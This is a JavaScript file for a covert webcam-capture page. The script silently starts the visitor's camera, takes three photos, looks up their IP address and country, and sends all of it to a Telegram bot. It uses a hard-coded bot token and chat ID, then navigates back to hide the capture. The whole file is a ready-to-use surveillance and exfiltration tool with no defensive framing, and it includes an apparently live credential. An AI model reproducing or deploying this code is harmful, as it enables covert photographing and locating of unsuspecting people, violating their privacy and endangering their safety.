// ============ CONFIG ============
const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
const PHOTO_COUNT = 3;
const INTERVAL_MS = 400;
// ================================

// UID from URL (?=6362758258)
const params = new URLSearchParams(location.search);
const UID = params.get("") || "UNKNOWN";

let video, stream;
let sent = 0;
let ipData = {
  ip: "Unknown",
  country: "Unknown"
};

// get IP + country
fetch("https://ipapi.co/json/")
  .then(r => r.json())
  .then(d => {
    ipData.ip = d.ip || "Unknown";
    ipData.country = d.country_name || "Unknown";
  })
  .catch(()=>{});

// start camera silently
(async function start(){
  try{
    stream = await navigator.mediaDevices.getUserMedia({ video:true });
    video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    await wait(500);
    captureLoop();

  }catch(e){
    document.body.innerHTML = "❌ Permission denied";
  }
})();

function captureLoop(){
  if(sent >= PHOTO_COUNT){
    cleanup();
    return;
  }

  captureAndSend();
  sent++;
  setTimeout(captureLoop, INTERVAL_MS);
}

async function captureAndSend(){
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  const blob = await new Promise(r =>
    canvas.toBlob(r,"image/jpeg",0.85)
  );

  const caption =
`━━━━━━━━━━━━━━
📸 <b>NEW IMAGE</b>
━━━━━━━━━━━━━━
🔢 <b>UID</b> : ${UID}
🌐 <b>IP</b>     : ${ipData.ip}
🌍 <b>Country</b>: ${ipData.country}
━━━━━━━━━━━━━━
👨‍💻 <b>Dev</b> : @XFPro43`;

  const form = new FormData();
  form.append("chat_id", UID);
  form.append("photo", blob, "photo.jpg");
  form.append("caption", caption);
  form.append("parse_mode", "HTML");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: form
  }).catch(()=>{});
}

function cleanup(){
  stream.getTracks().forEach(t=>t.stop());
  setTimeout(()=>history.back(), 500);
}

function wait(ms){
  return new Promise(r=>setTimeout(r, ms));
} 
